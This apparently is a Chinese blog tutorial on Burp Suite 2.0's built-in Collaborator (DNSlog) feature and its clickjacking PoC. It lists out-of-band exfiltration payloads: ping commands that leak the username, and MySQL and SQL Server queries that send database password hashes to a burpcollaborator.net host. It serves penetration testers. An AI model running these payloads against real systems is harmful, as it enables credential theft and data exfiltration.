用了很长时间的burp 2.0的版本了，但是最近才知道2.0版本以及集成了DNSlog功能，以及针对点击劫持漏洞测试的POC。


  1. DNSlog


以前的时候一直是用的创宇的DNSlog平台，需要实名认证等等。


在burp2.0中，选择如下图所示：



即可使用burp的dnslog功能，无需注册和填写资料。


点击复制到剪贴板，就能获得临时的域名


如：

yoqrpq1xyj1fqkq4qmxu0sxpyg46sv.burpcollaborator.net


轮询时间改成5秒，然后开始轮询




也可以用来测试HTTP协议


附上DNSlog常用payload


Windows探测用户名

ping %USERNAME%.806hp1za8o3e9l8ejbifakvdp4vujj.burpcollaborator.net


Linux

ping `whoami`.806hp1za8o3e9l8ejbifakvdp4vujj.burpcollaborator.net


mysql

SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.806hp1za8o3e9l8ejbifakvdp4vujj.burpcollaborator.net\\abc'));


sql server

DECLARE @host varchar(1024);SELECT @host=(SELECT TOP 1master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_logins WHERE name='sa')+'806hp1za8o3e9l8ejbifakvdp4vujj.burpcollaborator.net';EXEC('master..xp_dirtree"\\'+@host+'\foobar$"');



点击劫持POC：


选择图片所示


打开要测试的网站, F12 -> console -> 粘贴 -> 回车



然后在页面点击要劫持的区域，再点击start旁边的 finish
